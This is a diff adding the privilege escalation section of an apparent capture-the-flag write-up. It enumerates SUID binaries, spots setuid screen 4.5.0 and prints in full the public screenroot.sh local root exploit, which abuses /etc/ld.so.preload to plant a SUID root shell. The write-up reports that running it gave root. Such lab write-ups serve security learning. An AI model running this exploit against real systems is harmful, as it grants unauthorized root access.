@@ -230,6 +230,87 @@ reading the content of `password.txt` we got the password and then ssh using `jo
 
 ## Privilege Escalation
 
+```
+joker@ubuntu:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/sudo
+/bin/fusermount
+/bin/su
+/bin/ping6
+/bin/screen-4.5.0
+/bin/screen-4.5.0.old
+/bin/mount
+/bin/ping
+/bin/umount
+joker@ubuntu:~$ 
+```
+checking for suid, we can see that `/bin/screen-4.5.0` is an suid. let's search for exploit on this screen version.
+
+![image](https://user-images.githubusercontent.com/87468669/220822135-881c34f5-accc-44cd-9e35-51ca5c9e1f1f.png)
+
+found and [exploit](https://github.com/XiphosResearch/exploits/tree/master/screen2root) on github.
+
+```
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017) 
+echo "~ gnu/screenroot ~"
+echo "[+] First, we create our shell and library..."
+cat << EOF > /tmp/libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat << EOF > /tmp/rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c
+rm -f /tmp/rootshell.c
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so... 
+/tmp/rootshell
+```
+let's run this exploit.
+
+![image](https://user-images.githubusercontent.com/87468669/220822484-ef1391fd-e577-44df-8ae1-0ac3101598a2.png)
+
+running the exploit dropped us into a root shell. 
+
+![image](https://user-images.githubusercontent.com/87468669/220822833-fd753844-c631-4493-a144-33c432f1dd10.png)
+
+And we are through. 😉
 
 
 
